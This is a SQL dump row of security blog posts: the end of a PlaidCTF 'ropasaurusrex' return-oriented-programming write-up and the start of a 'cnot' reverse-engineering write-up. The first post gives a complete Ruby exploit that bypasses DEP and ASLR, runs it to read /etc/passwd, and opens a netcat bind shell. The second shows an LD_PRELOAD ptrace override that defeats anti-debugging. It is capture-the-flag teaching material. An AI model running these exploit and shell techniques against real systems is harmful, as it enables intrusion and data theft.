/etc/passwd into memory, we need to call system() and point it at that address. It turns out, if we assume ASLR is off, this is easy. We know that the executable is linked with libc:\n\r\n1 $ ldd ./ropasaurusrex\r\n2         linux-gate.so.1 =>  (0xb7703000)\r\n3         libc.so.6 => /lib/i686/cmov/libc.so.6 (0xb75aa000)\r\n4         /lib/ld-linux.so.2 (0xb7704000)\r\n\nAnd libc.so.6 contains the system() function:\n\r\n1 $ objdump -T /lib/i686/cmov/libc.so.6 | grep system\r\n2 000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr\r\n3 00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system\r\n4 00039450  w   DF .text  0000007d  GLIBC_2.0   system\r\n\nWe can figure out the address where system() ends up loaded in ropasaurusrex in our debugger:\n\r\n1 $ gdb --quiet ./ropasaurusrex core\r\n2 [...]\r\n3 Program terminated with signal 11, Segmentation fault.\r\n4 #0  0x43434343 in ?? ()\r\n5 (gdb) x/x system\r\n6 0xb7ec2450 <system>:    0x890cec83\r\n\nBecause system() only takes one argument, building the stackframe is pretty easy:\n\r\n+----------------------+\r\n|         ...          | - doesn\'t matter, other funcs will go here\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of system()\'s stack frame\r\n|      void *arg       | - our buffer, 0x08049530\r\n+----------------------+\r\n|   [return address]   | - where \'system\' will return\r\n+----------------------+\r\n|         ...          | - doesn\'t matter, system() will use for locals\r\n+----------------------+\r\n\nNow if we stack this on top of our read() frame, things are looking pretty good:\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of system()\'s stack frame\r\n|      void *arg       |\r\n+----------------------+\r\n|   [return address]   |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of read()\'s frame\r\n|     size_t count     |\r\n+----------------------+\r\n|      void *buf       |\r\n+----------------------+\r\n|        int fd        |\r\n+----------------------+\r\n| [address of system]  | <-- Stack pointer\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\nAt the moment that read() returns, the stack pointer is in the location shown above. When it returns, it pops read()\'s return address off the stack and jumps to it. When it does, this is what the stack looks like when read() returns: \n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of system()\'s frame\r\n|      void *arg       |\r\n+----------------------+\r\n|   [return address]   |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of read()\'s frame\r\n|     size_t count     |\r\n+----------------------+\r\n|      void *buf       |\r\n+----------------------+\r\n|        int fd        | <-- Stack pointer\r\n+----------------------+\r\n| [address of system]  |\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\nUh oh, that\'s no good! The stack pointer is pointing to the middle of read()\'s frame when we enter system(), not to the bottom of system()\'s frame like we want it to! What do we do?\nWell, when perform a ROP exploit, there\'s a very important construct we need called pop/pop/ret. In this case, it\'s actually pop/pop/pop/ret, which we\'ll call \"pppr\" for short. Just remember, it\'s enough \"pops\" to clear the stack, followed by a return.\npop/pop/pop/ret is a construct that we use to remove the stuff we don\'t want off the stack. Since read() has three arguments, we need to pop all three of them off the stack, then return. To demonstrate, here\'s what the stack looks like immediately after read() returns to a pop/pop/pop/ret:\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of system()\'s frame\r\n|      void *arg       |\r\n+----------------------+\r\n|   [return address]   |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Special frame for pop/pop/pop/ret\r\n| [address of system]  |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of read()\'s frame\r\n|     size_t count     |\r\n+----------------------+\r\n|      void *buf       |\r\n+----------------------+\r\n|        int fd        | <-- Stack pointer\r\n+----------------------+\r\n| [address of \"pppr\"]  |\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\nAfter \"pop/pop/pop/ret\" runs, but before it returns, we get this:\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of system()\'s frame\r\n|      void *arg       |\r\n+----------------------+\r\n|   [return address]   |\r\n+----------------------+\r\n\r\n+----------------------+ <-- pop/pop/pop/ret\'s frame\r\n| [address of system]  | <-- stack pointer\r\n+----------------------+\r\n\r\n+----------------------+\r\n|     size_t count     | <-- read()\'s frame\r\n+----------------------+\r\n|      void *buf       |\r\n+----------------------+\r\n|        int fd        |\r\n+----------------------+\r\n| [address of \"pppr\"]  |\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\nThen when it returns, we\'re exactly where we want to be:\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of system()\'s frame\r\n|      void *arg       |\r\n+----------------------+\r\n|   [return address]   | <-- stack pointer\r\n+----------------------+\r\n\r\n+----------------------+ <-- pop/pop/pop/ret\'s frame\r\n| [address of system]  |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of read()\'s frame\r\n|     size_t count     |\r\n+----------------------+\r\n|      void *buf       |\r\n+----------------------+\r\n|        int fd        |\r\n+----------------------+\r\n| [address of \"pppr\"]  |\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\nFinding a pop/pop/pop/ret is pretty easy using objdump:\n\r\n1 $ objdump -d ./ropasaurusrex | egrep \'pop|ret\'\r\n2 [...]\r\n3  80484b5:       5b                      pop    ebx\r\n4  80484b6:       5e                      pop    esi\r\n5  80484b7:       5f                      pop    edi\r\n6  80484b8:       5d                      pop    ebp\r\n7  80484b9:       c3                      ret\r\n\nThis lets us remove between 1 and 4 arguments off the stack before executing the next function. Perfect!\nAnd remember, if you\'re doing this yourself, ensure that the pops are at consecutive addresses. Using egrep to find them can be a little dangerous like that.\nSo now, if we want a triple pop and a ret (to remove the three arguments that read() used), we want the address 0x80484b6, so we set up our stack like this:\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of system()\'s frame\r\n|      void *arg       | - 0x08049530 (buf)\r\n+----------------------+\r\n|   [return address]   | - 0x44444444\r\n+----------------------+\r\n\r\n+----------------------+\r\n| [address of system]  | - 0xb7ec2450\r\n+----------------------+\r\n\r\n+----------------------+ <-- Start of read()\'s frame\r\n|     size_t count     | - strlen(cmd)\r\n+----------------------+\r\n|      void *buf       | - 0x08049530 (buf)\r\n+----------------------+\r\n|        int fd        | - 0 (stdin)\r\n+----------------------+\r\n| [address of \"pppr\"]  | - 0x080484b6\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\nWe also update our exploit with a s.read() at the end, to read whatever data the remote server sends us. The current exploit now looks like:\n\r\n 1 require \'socket\'\r\n 2 \r\n 3 s = TCPSocket.new(\"localhost\", 4444)\r\n 4 \r\n 5 # The command we\'ll run\r\n 6 cmd = ARGV[0] + \"\\0\"\r\n 7 \r\n 8 # From objdump -x\r\n 9 buf = 0x08049530\r\n10 \r\n11 # From objdump -D ./ropasaurusrex | grep read\r\n12 read_addr = 0x0804832C\r\n13 # From objdump -D ./ropasaurusrex | grep write\r\n14 write_addr = 0x0804830C\r\n15 # From gdb, \"x/x system\"\r\n16 system_addr = 0xb7ec2450\r\n17 # From objdump, \"pop/pop/pop/ret\"\r\n18 pppr_addr = 0x080484b6\r\n19 \r\n20 # Generate the payload\r\n21 payload = \"A\"*140 +\r\n22   [\r\n23     # system()\'s stack frame\r\n24     buf,         # writable memory (cmd buf)\r\n25     0x44444444,  # system()\'s return address\r\n26 \r\n27     # pop/pop/pop/ret\'s stack frame\r\n28     system_addr, # pop/pop/pop/ret\'s return address\r\n29 \r\n30     # read()\'s stack frame\r\n31     cmd.length,  # number of bytes\r\n32     buf,         # writable memory (cmd buf)\r\n33     0,           # stdin\r\n34     pppr_addr,   # read()\'s return address\r\n35 \r\n36     read_addr # Overwrite the original return\r\n37   ].reverse.pack(\"I*\") # Convert a series of \'ints\' to a string\r\n38 \r\n39 # Write the \'exploit\' payload\r\n40 s.write(payload)\r\n41 \r\n42 # When our payload calls read() the first time, this is read\r\n43 s.write(cmd)\r\n44 \r\n45 # Read the response from the command and print it to the screen\r\n46 puts(s.read)\r\n47 \r\n48 # Clean up\r\n49 s.close()\r\n\nAnd when we run it, we get the expected result:\n\r\n1 $ ruby sploit.rb \"cat /etc/passwd\"\r\n2 root:x:0:0:root:/root:/bin/bash\r\n3 daemon:x:1:1:daemon:/usr/sbin:/bin/sh\r\n4 bin:x:2:2:bin:/bin:/bin/sh\r\n5 ...\r\n\nAnd if you look at the core dump, you\'ll see it\'s crashing at 0x44444444 as expected.\nDone, right?\nWRONG!\nThis exploit worked perfectly against my test machine, but when ASLR is enabled, it failed:\n\r\n1 $ sudo sysctl -w kernel.randomize_va_space=1\r\n2 kernel.randomize_va_space = 1\r\n3 ron@debian-x86 ~ $ ruby sploit.rb \"cat /etc/passwd\"\r\n\nThis is where it starts to get a little more complicated. Let\'s go!\nWhat is ASLR?\nASLR—or address space layout randomization—is a defense implemented on all modern systems (except for FreeBSD) that randomizes the address that libraries are loaded at. As an example, let\'s run ropasaurusrex twice and get the address of system():\n\r\n 1 ron@debian-x86 ~ $ perl -e \'printf \"A\"x1000\' | ./ropasaurusrex\r\n 2 Segmentation fault (core dumped)\r\n 3 ron@debian-x86 ~ $ gdb ./ropasaurusrex core\r\n 4 Program terminated with signal 11, Segmentation fault.\r\n 5 #0  0x41414141 in ?? ()\r\n 6 (gdb) x/x system\r\n 7 0xb766e450 <system>:    0x890cec83\r\n 8 \r\n 9 ron@debian-x86 ~ $ perl -e \'printf \"A\"x1000\' | ./ropasaurusrex\r\n10 Segmentation fault (core dumped)\r\n11 ron@debian-x86 ~ $ gdb ./ropasaurusrex core\r\n12 Program terminated with signal 11, Segmentation fault.\r\n13 #0  0x41414141 in ?? ()\r\n14 (gdb) x/x system\r\n15 0xb76a7450 <system>:    0x890cec83\r\n\nNotice that the address of system() changes from 0xb766e450 to 0xb76a7450. That\'s a problem!\nDefeating ASLR\nSo, what do we know? Well, the binary itself isn\'t ASLRed, which means that we can rely on every address in it to stay put, which is useful. Most importantly, the relocation table will remain at the same address:\n\r\n 1 $ objdump -R ./ropasaurusrex\r\n 2 \r\n 3 ./ropasaurusrex:     file format elf32-i386\r\n 4 \r\n 5 DYNAMIC RELOCATION RECORDS\r\n 6 OFFSET   TYPE              VALUE\r\n 7 08049600 R_386_GLOB_DAT    __gmon_start__\r\n 8 08049610 R_386_JUMP_SLOT   __gmon_start__\r\n 9 08049614 R_386_JUMP_SLOT   write\r\n10 08049618 R_386_JUMP_SLOT   __libc_start_main\r\n11 0804961c R_386_JUMP_SLOT   read\r\n\nSo we know the address—in the binary—of read() and write(). What\'s that mean? Let\'s take a look at their values while the binary is running:\n\r\n1 $ gdb ./ropasaurusrex\r\n2 (gdb) run\r\n3 ^C\r\n4 Program received signal SIGINT, Interrupt.\r\n5 0xb7fe2424 in __kernel_vsyscall ()\r\n6 (gdb) x/x 0x0804961c\r\n7 0x804961c:      0xb7f48110\r\n8 (gdb) print read\r\n9 $1 = {<text variable, no debug info>} 0xb7f48110 <read>\r\n\nWell look at that.. a pointer to read() at a memory address that we know! What can we do with that, I wonder...? I\'ll give you a hint: we can use the write() function—which we also know—to grab data from arbitrary memory and write it to the socket.\nFinally, running some code!\nOkay, let\'s break, this down into steps. We need to:\n\nCopy a command into memory using the read() function.\nGet the address of the write() function using the write() function.\nCalculate the offset between write() and system(), which lets us get the address of system().\nCall system().\n\nTo call system(), we\'re gonna have to write the address of system() somewhere in memory, then call it. The easiest way to do that is to overwrite the call to read() in the .plt table, then call read().\nBy now, you\'re probably confused. Don\'t worry, I was too. I was shocked I got this working. :)\nLet\'s just go for broke now and get this working! Here\'s the stack frame we want:\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\r\n+----------------------+ <-- system()\'s frame [7]\r\n|      void *arg       | \r\n+----------------------+\r\n|   [return address]   | \r\n+----------------------+\r\n\r\n+----------------------+ <-- pop/pop/pop/ret\'s frame [6]\r\n|  [address of read]   | - this will actually jump to system()\r\n+----------------------+\r\n\r\n+----------------------+ <-- second read()\'s frame [5]\r\n|     size_t count     | - 4 bytes (the size of a 32-bit address)\r\n+----------------------+\r\n|      void *buf       | - pointer to read() so we can overwrite it\r\n+----------------------+\r\n|        int fd        | - 0 (stdin)\r\n+----------------------+\r\n| [address of \"pppr\"]  |\r\n+----------------------+\r\n\r\n+----------------------+ <-- pop/pop/pop/ret\'s frame [4]\r\n|  [address of read]   |\r\n+----------------------+\r\n\r\n+----------------------+ <-- write()\'s frame [3]\r\n|     size_t count     | - 4 bytes (the size of a 32-bit address)\r\n+----------------------+\r\n|      void *buf       | - The address containing a pointer to read()\r\n+----------------------+\r\n|        int fd        | - 1 (stdout)\r\n+----------------------+\r\n| [address of \"pppr\"]  |\r\n+----------------------+\r\n\r\n+----------------------+ <-- pop/pop/pop/ret\'s frame [2]\r\n|  [address of write]  |\r\n+----------------------+\r\n\r\n+----------------------+ <-- read()\'s frame [1]\r\n|     size_t count     | - strlen(cmd)\r\n+----------------------+\r\n|      void *buf       | - writeable memory\r\n+----------------------+\r\n|        int fd        | - 0 (stdin)\r\n+----------------------+\r\n| [address of \"pppr\"]  |\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          |\r\n+----------------------+\r\n\nHoly smokes, what\'s going on!?\nLet\'s start at the bottom and work our way up! I tagged each frame with a number for easy reference.\nFrame [1] we\'ve seen before. It writes cmd into our writable memory. Frame [2] is a standard pop/pop/pop/ret to clean up the read().\nFrame [3] uses write() to write the address of the read() function to the socket. Frame [4] uses a standard pop/pop/pop/ret to clean up after write().\nFrame [5] reads another address over the socket and writes it to memory. This address is going to be the address of the system() call. The reason writing it to memory works is because of how read() is called. Take a look at the read() call we\'ve been using in gdb (0x0804832C) and you\'ll see this:\n\r\n1 (gdb) x/i 0x0804832C\r\n2 0x804832c <read@plt>:   jmp    DWORD PTR ds:0x804961c\r\n\nread() is actually implemented as an indirect jump! So if we can change what ds:0x804961c\'s value is, and still jump to it, then we can jump anywhere we want! So in frame [3] we read the address from memory (to get the actual address of read()) and in frame [5] we write a new address there.\nFrame [6] is a standard pop/pop/pop/ret construct, with a small difference: the return address of the pop/pop/pop/ret is 0x804832c, which is actually read()\'s .plt entry. Since we overwrote read()\'s .plt entry with system(), this call actually goes to system()!\nFinal code\nWhew! That\'s quite complicated. Here\'s code that implements the full exploit for ropasaurusrex, bypassing both DEP and ASLR:\n\r\n 1 require \'socket\'\r\n 2 \r\n 3 s = TCPSocket.new(\"localhost\", 4444)\r\n 4 \r\n 5 # The command we\'ll run\r\n 6 cmd = ARGV[0] + \"\\0\"\r\n 7 \r\n 8 # From objdump -x\r\n 9 buf = 0x08049530\r\n10 \r\n11 # From objdump -D ./ropasaurusrex | grep read\r\n12 read_addr = 0x0804832C\r\n13 # From objdump -D ./ropasaurusrex | grep write\r\n14 write_addr = 0x0804830C\r\n15 # From gdb, \"x/x system\"\r\n16 system_addr = 0xb7ec2450\r\n17 # Fram objdump, \"pop/pop/pop/ret\"\r\n18 pppr_addr = 0x080484b6\r\n19 \r\n20 # The location where read()\'s .plt entry is\r\n21 read_addr_ptr = 0x0804961c\r\n22 \r\n23 # The difference between read() and system()\r\n24 # Calculated as  read (0xb7f48110) - system (0xb7ec2450)\r\n25 # Note: This is the one number that needs to be calculated using the\r\n26 # target version of libc rather than my own!\r\n27 read_system_diff = 0x85cc0\r\n28 \r\n29 # Generate the payload\r\n30 payload = \"A\"*140 +\r\n31   [\r\n32     # system()\'s stack frame\r\n33     buf,         # writable memory (cmd buf)\r\n34     0x44444444,  # system()\'s return address\r\n35 \r\n36     # pop/pop/pop/ret\'s stack frame\r\n37     # Note that this calls read_addr, which is overwritten by a pointer\r\n38     # to system() in the previous stack frame\r\n39     read_addr,   # (this will become system())\r\n40 \r\n41     # second read()\'s stack frame\r\n42     # This reads the address of system() from the socket and overwrites\r\n43     # read()\'s .plt entry with it, so calls to read() end up going to\r\n44     # system()\r\n45     4,           # length of an address\r\n46     read_addr_ptr, # address of read()\'s .plt entry\r\n47     0,           # stdin\r\n48     pppr_addr,   # read()\'s return address\r\n49 \r\n50     # pop/pop/pop/ret\'s stack frame\r\n51     read_addr,\r\n52 \r\n53     # write()\'s stack frame\r\n54     # This frame gets the address of the read() function from the .plt\r\n55     # entry and writes to to stdout\r\n56     4,           # length of an address\r\n57     read_addr_ptr, # address of read()\'s .plt entry\r\n58     1,           # stdout\r\n59     pppr_addr,   # retrurn address\r\n60 \r\n61     # pop/pop/pop/ret\'s stack frame\r\n62     write_addr,\r\n63 \r\n64     # read()\'s stack frame\r\n65     # This reads the command we want to run from the socket and puts it\r\n66     # in our writable \"buf\"\r\n67     cmd.length,  # number of bytes\r\n68     buf,         # writable memory (cmd buf)\r\n69     0,           # stdin\r\n70     pppr_addr,   # read()\'s return address\r\n71 \r\n72     read_addr # Overwrite the original return\r\n73   ].reverse.pack(\"I*\") # Convert a series of \'ints\' to a string\r\n74 \r\n75 # Write the \'exploit\' payload\r\n76 s.write(payload)\r\n77 \r\n78 # When our payload calls read() the first time, this is read\r\n79 s.write(cmd)\r\n80 \r\n81 # Get the result of the first read() call, which is the actual address of read\r\n82 this_read_addr = s.read(4).unpack(\"I\").first\r\n83 \r\n84 # Calculate the address of system()\r\n85 this_system_addr = this_read_addr - read_system_diff\r\n86 \r\n87 # Write the address back, where it\'ll be read() into the correct place by\r\n88 # the second read() call\r\n89 s.write([this_system_addr].pack(\"I\"))\r\n90 \r\n91 # Finally, read the result of the actual command\r\n92 puts(s.read())\r\n93 \r\n94 # Clean up\r\n95 s.close()\r\n\nAnd here it is in action:\n\r\n1 $ ruby sploit.rb \"cat /etc/passwd\"\r\n2 root:x:0:0:root:/root:/bin/bash\r\n3 daemon:x:1:1:daemon:/usr/sbin:/bin/sh\r\n4 bin:x:2:2:bin:/bin:/bin/sh\r\n5 sys:x:3:3:sys:/dev:/bin/sh\r\n6 [...]\r\n\nYou can, of course, change cat /etc/passwd to anything you want (including a netcat listener!)\n\r\n 1 ron@debian-x86 ~ $ ruby sploit.rb \"pwd\"\r\n 2 /home/ron\r\n 3 ron@debian-x86 ~ $ ruby sploit.rb \"whoami\"\r\n 4 ron\r\n 5 ron@debian-x86 ~ $ ruby sploit.rb \"nc -vv -l -p 5555 -e /bin/sh\" &\r\n 6 [1] 3015\r\n 7 ron@debian-x86 ~ $ nc -vv localhost 5555\r\n 8 debian-x86.skullseclabs.org [127.0.0.1] 5555 (?) open\r\n 9 pwd\r\n10 /home/ron\r\n11 whoami\r\n12 ron\r\n\nConclusion\nAnd that\'s it! We just wrote a reliable, DEP/ASLR-bypassing exploit for ropasaurusrex.\nFeel free to comment or contact me if you have any questions!', '\'Hacking\', \'PlaidCTF 2013\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (35, 'Epic “cnot” Writeup (highest value level from PlaidCTF)', 'Ron Bowes', '2013-4-25', 'When I was at Shmoocon, I saw a talk about how to write an effective capture-the-flag contest. One of their suggestions was to have a tar-pit challenge that would waste all the time of the best player, by giving him a complicated challenge he won\'t be able to resist. In my opinion, in PlaidCTF, I suspected that \"cnot\" was that challenge. And I was the sucker, even though I knew it all the way...\n(It turns out, after reviewing writeups of other challenges, that most of the challenges were like this; even so, I\'m proud to have been sucked in!)\nIf you want a writeup where you can learn something, I plan to post a writeup for \"Ropasaurus\" in the next day or two. If you want a writeup about me being tortured as I fought through inconceivable horrors to finish a level and capture the bloody flag, read on! This level wasn\'t a lot of learning, just brute-force persistence.\n\nIt\'s worthwhile to note that I\'m not going to cover every piece or every line—maybe I\'ll do that as a novel in the future—this is mostly going to be a summary. Even so, this is going to be a long writeup. I\'m trying to make it interesting and fun to read, and to break it into shorter sections. But heed this warning!\nAlso, I may switch between \"I\" and \"we\" throughout the writeup. This indicates when I was being helped by somebody, when I was alone, and when I was simply going insane. I\'m pretty sure the voices in my head helping with a solution are a good enough reason to say \"we\" instead of \"I\", right?\nNow that the contest is over, the source has been released. Here\'s the command they used for compiling it, directly from that source:\n\r\n1 // compile with:\r\n2 // isildur cnot.c0 -l l4rt.h0 -o test.s --obfuscate --anti-debug --confuse\r\n3 // gcc test.s obf.c -o cnot\r\n4 // strip cnot\r\n\n--obfuscate, --anti-debug, and --confuse? Awww, you shouldn\'t have! But, I digress. I didn\'t have this info back then...\nBeing that I fancy myself a reverse engineer, this level appealed to me right away. In fact, it\'s the first one I looked at, despite it being the highest point value. Go big or go home!\nI spent about fifteen minutes poking around. I determined that the binary was ugly as sin, that the debugger didn\'t work, and that it was 64-bit Intel assembly. Well fuck, I don\'t even know x64 (well, I didn\'t when I started this CTF, at least). So I gave up and moved onto another level, Ropasaurus (which will have its own writeup).\nAfter solving a some other levels with the help of HikingPete (Ropasaurus, Cyrpto, and charsheet), I came back to cnot late Friday night. Mak and Nate had put several hours into it and had given up. It was all up to me.\nLet\'s start by summarizing the weekend...\nWork on it till 6am. Wake up at 9am. Work on another problem for a couple hours, return to cnot by noon. Work solid—besides a meal—till 6am again. Getting so close, but totally stuck.\nWake up early again, go straight to it. 9am I think? Stuck, so stuck. Came up with ideas, failed, more ideas, failed failed failed. Finally, thought of something. Can it work...? IT DID! FLAG OBTAINED!! Hardest binary I\'ve ever reversed, and I was suddenly an expert on x64! Done by 2pm, too! That means I only spent.. thirty hours? Is that right? Dear lord...\nAnd you know what the kicker is? Even without the obfuscation, without the anti-debugging, and without the... confusion? This still would have been a goddamn hard binary! Hell, take a look at the C version. Even that would have been a huge pain!\nBut now I\'m definitely getting ahead of myself. The rest of this document will be about what worked, I don\'t explore too many of the \'wrong paths\' I took, except where it\'s pedagogical to do so. \nThe setup\nBasically, we had a 64-bit Linux executable file, and no hints of any kind. I fired up a Debian 6.0.7 machine with basically default everything, except that I installed my favourite dev/reversing tools that you\'ll see throughout this writeup. I also had a Windows machine with a modern version of IDA Pro. If you plan to do any reversing, you need IDA Pro. The free version works for most stuff, but modern versions are way faster and handle a lot more madness.\nYou run the program, it simply asks for a password. You type in something, and it generally says \"Wrong!\" and ends:\n\r\n1 ron@debian-x86 ~/cnot $ ./cnot\r\n2 Please enter your password: hello\r\n3 Wrong!\r\n\nThe goal was to figure out the password for this executable, which was the flag.\nAnd that\'s our starting point. So far so good!\nAt this point, I had a lot of ideas. Sometimes, you start with the error message, work your way back to a comparison, and look at what\'s being compared to what. Sometimes, you start with the input and look at how it\'s being mangled. Or sometimes, you quietly sob in the corner. I tried the first two approaches at the start, and then steadily moved on to the last.\nWasted effort\nMak and Nate had started working on the project without me, and Mak had started writing a timing-attack tool. Sometimes, if one letter is compared at a time, you can derive each letter individually by timing the comparisons and looking at which one is the fastest. That could save a ton of reversing time!\nIf I\'d known then what I know now, I wouldn\'t have bothered. This had no hope of working. But it was worth a shot! \nI helped Mak finish a program that would:\n\nChoose a letter\nWrite it to a file\nStart a high resolution timer (using rdtsc, which counts the number of cycles since reset)\nRun the process\nRead the timer state\nRepeat for each letter, choose the best\nGo back to the top and choose another letter\n\nThis works exceptionally well, in some cases. This was not one of the cases. It turns out that the letters were validated with a checksum first, which instantly breaks it. Then they were validated out of order, and in various other ways, all of which would break this. So, long story short, it was a waste of our time.\nLuckily, after an hour or two, I said \"this isn\'t working\" and we moved on without ever looking back.\nAnti-debugging\nOur first step was anti-debugging, because this:\n\r\n1 $ gdb ./cnot\r\n2 Reading symbols from /home/ron/cnot/cnot...(no debugging symbols found)...done.\r\n3 (gdb) run hello\r\n4 Starting program: /home/ron/cnot/cnot hello\r\n5 \r\n6 Program received signal SIGSEGV, Segmentation fault.\r\n7 0x00400b86 in ?? ()\r\n8 \r\n\nYou assholes! If you run it with strace, you\'ll see this:\n\r\n1 trace ./cnot 2>&1 | tail -n4\r\n2   munmap(0x7f5cc9159000, 63692)           = 0\r\n3   ptrace(PTRACE_TRACEME, 0, 0, 0)         = -1 EPERM (Operation not permitted)\r\n4   --- SIGSEGV (Segmentation fault) @ 0 (0) ---\r\n5   +++ killed by SIGSEGV (core dumped) +++\r\n6 \r\n\nSo it\'s calling ptrace right before dying, eh? Well, I know how to deal with that! Mak wrote a quick library:\n\r\n1   ron@debian-x64 ~/cnot $ echo \'long ptrace(int a, int b, int c){return 0;}\' > override.c\r\n2   ron@debian-x64 ~/cnot $ gcc -shared -fPIC -o override.so ./override.c\r\n\nAdd it to our gdbinit file:\n\r\n1 $ cat gdbinit\r\n2 # Set up the environment\r\n3 set disassembly-flavor intel\r\n4 set confirm off\r\n5 \r\n6 # Disable the anti-debugging\r\n7 set environment LD_PRELOAD ./overload.so\r\n\nAnd run the program with that gdbinit file:\n\r\n1 $ gdb -x ./gdbinit ./cnot\r\n2 Reading symbols from /home/ron/cnot/cnot...(no debugging symbols found)...done.\r\n3 (gdb) run\r\n4 Please enter your password: hello\r\n5 Wrong!\r\n6 \r\n7 Program exited normally.\r\n8 \r\n\nThankfully, that was the only anti-debugging measure taken. gdbinit files are actually something I learned from Mak while working on the IO Wargame, and are one of the most valuable tools in your debugging arsenal!\nFirst steps\nFirst of all, let\'s take a look at the imports; this can be done more easily in IDA, but to avoid filling this writeup with screenshots, I\'ll use objdump to get the equivalent information:\n\r\n 1 ron@debian-x86 ~/cnot $ objdump -R cnot\r\n 2 \r\n 3 cnot:     file format elf64-x86-64\r\n 4 \r\n 5 DYNAMIC RELOCATION RECORDS\r\n 6 OFFSET           TYPE              VALUE\r\n 7 006101b8 R_X86_64_GLOB_DAT   __gmon_start__\r\n 8 00610240 R_X86_64_COPY       stdin\r\n 9 00610250 R_X86_64_COPY       stdout\r\n10 006101d8 R_X86_64_JUMP_SLOT  __isoc99_fscanf\r\n11 006101e0 R_X86_64_JUMP_SLOT  exit\r\n12 006101e8 R_X86_64_JUMP_SLOT  __libc_start_main\r\n13 006101f0 R_X86_64_JUMP_SLOT  ungetc\r\n14 006101f8 R_X86_64_JUMP_SLOT  fputc\r\n15 00610200 R_X86_64_JUMP_SLOT  fgetc\r\n16 00610208 R_X86_64_JUMP_SLOT  ptrace\r\n17 00610210 R_X86_64_JUMP_SLOT  raise\r\n18 00610218 R_X86_64_JUMP_SLOT  calloc\r\n19 00610220 R_X86_64_JUMP_SLOT  feof\r\n20 00610228 R_X86_64_JUMP_SLOT  fprintf\r\n\nfputc() and fgetc() were the ones I was most interested in. To make a long story short, we put a breakpoint on fputc() to see when it was called. It was called twice for each character. Once—at offset 0x40F63B—it was in a function that checked for EOF (end of file) then used ungetc() to put it back. It was never actually returned. The other time—at offset 0x40F723—it was called then the function returned the character. That\'s where I focused.\nI used a breakpoint to confirm that it was actually calling each of those functions for every character I entered. It was.\nAt that point, I tried to follow the logic onward from where the value was read. Me and Mak, together, followed the path that was then taken through the code. Essentially, checks were done for EOF, for NULL being returned from fgetc(), and for a newline. If it was any of those, it would jump to a label that I called found_newline or something like that. We pushed our way through the obfuscated code, though, which IDA did a poor job of figuring out.\nEventually, we managed to get back to the fgetc() calls through the biiiig loop. When I tried to follow the other code path, to see how the program handles the completed string, I quickly became lost.\nI then tried the other approach—starting from the \"Wrong!\" label and working backwards. I found all the calls to fputc() in gdb by doing the following:\nRun the program until it requests password (recalling that \"-x ./gdbinit\" loads my init script, which loads override.so to fix the anti-debugging), then break by using ctrl-c:\n\r\n 1 $ gdb -x ./gdbinit ./cnot\r\n 2 Reading symbols from /home/ron/cnot/cnot...(no debugging symbols found)...done.\r\n 3 (gdb) run\r\n 4 Please enter your password: ^C\r\n 5 Program received signal SIGINT, Interrupt.\r\n 6 0x00007ffff793f870 in read () from /lib/libc.so.6\r\n 7 \r\n\nAdd a breakpoint at fputc(), then continue and enter \"hello\" for my password:\n\r\n 8 \r\n 9 (gdb) b fputc\r\n10 Breakpoint 1 at 0x7ffff78e26d0\r\n11 (gdb) cont\r\n12 hello\r\n13 \r\n\nOnce it breaks, run the \"finish\" command twice to exit two layers of function:\n\r\n14 \r\n15 Breakpoint 1, 0x00007ffff78e26d0 in fputc () from /lib/libc.so.6\r\n16 (gdb) finish\r\n17 0x0040f6c6 in ?? ()\r\n18 (gdb) finish\r\n19 0x00400840 in ?? ()\r\n\nNow we\'re at 0x400840. If you look at the function it\'s in, you\'ll see that it ends like this:\n\r\n1 .text:00400851     pop     rdi\r\n2 .text:00400852     jmp     rdi\r\n\nAs a result, gdb won\'t be able to \"finish\" properly since it never (technically) returns! Instead, we set a breakpoint on the last line then use the \"stepi\" command to step out:\n\r\n1 (gdb) break *0x400852\r\n2 Breakpoint 2 at 0x400852\r\n3 (gdb) cont\r\n4 \r\n5 Breakpoint 2, 0x00400852 in ?? ()\r\n6 (gdb) stepi\r\n7 0x0040f149 in ?? ()\r\n\n0x40f149! If you\'re following along in IDA, you\'ll see a ton of undefined code there. D\'oh! You can use \'c\' to define the code in IDA, just keep moving up and down and pressing \'c\' (and occasionally \'u\' when you see SSE instructions) in various places till stuff looks right. Eventually, you\'ll see:\n\r\n 1 .text:0040F10F     mov     qword ptr [rbp-68h], 0\r\n 2 .text:0040F117     mov     dword ptr [rbp-68h], \'W\'\r\n 3 .text:0040F11E     push    r8\r\n 4 .text:0040F120     push    r9\r\n 5 .text:0040F122     push    rcx\r\n 6 .text:0040F123     xor     rcx, rcx\r\n 7 .text:0040F126     jz      short near ptr loc_40F128+1\r\n 8 .text:0040F128\r\n 9 .text:0040F128 loc_40F128:\r\n10 .text:0040F128     mulps   xmm2, xmmword ptr 